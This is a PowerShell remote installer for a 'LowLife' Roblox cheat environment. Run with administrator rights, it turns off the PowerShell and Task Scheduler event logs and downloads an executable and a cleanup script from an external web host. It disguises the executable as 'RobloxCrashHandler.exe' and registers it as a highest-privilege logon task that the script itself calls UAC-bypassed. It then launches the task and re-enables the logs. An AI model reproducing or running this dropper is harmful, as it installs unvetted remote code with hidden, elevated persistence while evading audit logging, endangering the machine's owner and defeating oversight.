# ==============================================================================
# LowLife Cheat Environment Remote Installer
# ==============================================================================
$ErrorActionPreference = "Stop"

# CONFIGURATION: Update this URL to point to the folder on your web server where
# you uploaded the precompiled 'RobloxCrashHandler.exe' and 'cleanup.ps1' files.
$ServerBaseUrl = "https://cc312123.github.io/lowlife/files"

$InstallFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
$KeyFileInstalled = Join-Path $InstallFolder "key.txt"

# Verify Administrator privileges
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host "       ERROR: THIS SCRIPT MUST BE RUN AS ADMINISTRATOR!     " -ForegroundColor Red
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host "Please re-run your PowerShell session as Administrator to install."
    Write-Host "==========================================================" -ForegroundColor Red
    Exit
}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "           LOWLIFE SYSTEM REMOTE INSTALLER                " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# Disable logging temporarily to keep the installation clean
wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>$null
wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null

# License Key setup
$licenseKey = ""
if (Test-Path $KeyFileInstalled) {
    $licenseKey = (Get-Content $KeyFileInstalled).Trim()
}

if (-not $licenseKey) {
    Write-Host "License key not found locally." -ForegroundColor Yellow
    $licenseKey = Read-Host "Please enter your LowLife license key"
    if ([string]::IsNullOrWhiteSpace($licenseKey)) {
        Write-Error "License key cannot be empty."
    }
    $licenseKey = $licenseKey.Trim()
}

# 1. Terminate existing services/tasks to prevent file lock issues
Write-Host "[1/5] Stopping any running instances..." -ForegroundColor Yellow
if (Get-ScheduledTask -TaskName "RobloxCrashHandler" -ErrorAction SilentlyContinue) {
    Stop-ScheduledTask -TaskName "RobloxCrashHandler" -ErrorAction SilentlyContinue
}
Stop-Process -Name "RobloxCrashHandler" -Force -ErrorAction SilentlyContinue

# 2. Create the target installation directory
if (-not (Test-Path $InstallFolder)) {
    New-Item -ItemType Directory -Path $InstallFolder -Force | Out-Null
}

# 3. Download the pre-compiled files from your server
Write-Host "[2/5] Downloading program files from server..." -ForegroundColor Yellow
$InstallPathExe = "$InstallFolder\RobloxCrashHandler.exe"
$CleanupScriptInstalled = "$InstallFolder\cleanup.ps1"

# Handle file rename override if locked
if (Test-Path $InstallPathExe) { 
    Rename-Item -Path $InstallPathExe -NewName "RobloxCrashHandler.exe.old" -Force -ErrorAction SilentlyContinue 
}

# Download files
Invoke-WebRequest -Uri "$ServerBaseUrl/RobloxCrashHandler.exe" -OutFile $InstallPathExe -UseBasicParsing
Invoke-WebRequest -Uri "$ServerBaseUrl/cleanup.ps1" -OutFile $CleanupScriptInstalled -UseBasicParsing

# Save the configured license key
$licenseKey | Out-File -FilePath $KeyFileInstalled -Encoding utf8 -NoNewline
Write-Host "Files successfully downloaded to: $InstallFolder" -ForegroundColor Green

# 4. Configure elevated UAC-bypassed Scheduled Task
Write-Host "[3/5] Registering Task Scheduler service..." -ForegroundColor Yellow
schtasks /create /tn "RobloxCrashHandler" /tr "$InstallPathExe" /sc onlogon /rl highest /f

# 5. Launch the Loader
Write-Host "[4/5] Starting service..." -ForegroundColor Yellow
schtasks /run /tn "RobloxCrashHandler"

# Re-enable Event Logging
wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:true 2>$null
wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null

Write-Host "==========================================================" -ForegroundColor Green
Write-Host " SUCCESS: Installation complete! Services are active.      " -ForegroundColor Green
Write-Host " -> Portals Active at: http://localhost:9876/              " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Green
